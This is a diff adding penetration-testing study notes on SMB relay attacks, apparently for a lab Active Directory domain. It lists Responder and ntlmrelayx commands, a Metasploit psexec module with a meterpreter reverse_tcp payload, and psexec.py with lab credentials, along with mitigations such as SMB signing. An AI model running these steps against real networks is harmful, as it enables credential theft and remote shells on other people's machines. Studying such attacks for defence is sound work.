@@ -67,3 +67,92 @@
     * Require Network Access Control
 
     * Use strong password policy
+
+* SMB Relay:
+
+  * Instead of cracking hashes gathered with Responder, we can relay those hashes to specific machines and gain access.
+
+  * Requirements:
+
+    * SMB signing must be disabled on target
+    * Relayed user creds must be admin on machine
+
+  * Steps:
+
+    * Discover hosts with SMB signing disabled
+
+    ```shell
+    nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
+    #we need to note down machines with 'message signing enabled but not required'
+
+    vim targets.txt
+    #add target IPs
+    ```
+
+    * Edit Responder config - turn SMB and HTTP off
+
+    ```shell
+    vim /etc/responder/Responder.conf
+    #turn SMB, HTTP off
+    ```
+
+    * Run Responder tool
+
+    ```shell
+    python Responder.py -I eth0 -rdw
+    ```
+
+    * Setup relay
+
+    ```shell
+    python ntlmrelayx.py -tf targets.txt -smb2support
+
+    #trigger connection in Windows machine
+    #by pointing it at the attacker machine
+
+    #-i option can be used for an interactive shell
+    ```
+
+    * Event occurs in Windows machine
+
+    * Credentials are captured (and saved) and we get access to machine
+
+  * Mitigation:
+
+    * Enable SMB signing on all devices
+
+    * Disable NTLM authentication on network
+
+    * Account tiering
+
+    * Local admin restriction (to prevent lateral movement)
+
+* Gaining Shell Access:
+
+```shell
+#this step has to be done once we have the credentials
+msfconsole
+
+search psexec
+
+use exploit/windows/smb/psexec
+
+options
+#set all required options
+#such as RHOSTS, smbdomain, smbpass and smbuser
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST eth0
+
+run
+#run exploit
+```
+
+```shell
+#we can use another tool called psexec.py
+psexec.py marvel.local/fcastle:Password1@192.168.57.141
+
+#try multiple options if these tools do not work
+#such as smbexec and wmiexec
+```
